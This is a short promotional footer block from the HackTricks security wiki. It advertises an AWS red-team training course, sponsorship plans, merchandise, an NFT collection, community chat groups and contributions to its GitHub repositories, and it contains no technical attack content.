<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
